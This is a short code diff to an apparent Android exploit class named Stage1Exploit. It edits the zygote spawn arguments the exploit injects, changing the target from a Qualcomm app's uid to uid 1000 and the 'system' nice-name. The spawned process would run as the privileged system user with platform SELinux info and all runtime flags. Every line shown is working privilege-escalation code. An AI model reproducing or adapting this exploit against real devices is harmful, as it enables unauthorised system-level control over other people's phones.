@@ -189,12 +189,12 @@ class Stage1Exploit:
         assert "," not in command
         # TODO let you specify the SELinux context through command line arguments
         raw_zygote_arguments = [
-            "--setuid=10059",
-            "--setgid=10059",
+            "--setuid=1000",
+            "--setgid=1002",
             "--setgroups=3003",
             "--target-sdk-version=28",
-            "--nice-name=com.qualcomm.atfwd",
-            "--app-data-dir=/data/user/0/com.qualcomm.atfwd",
+            "--nice-name=system",
+            "--app-data-dir=/data/user/0/com.android.settings",
             "--runtime-args",
             "--seinfo=platform:system_app:complete",
             "--runtime-flags=32767",
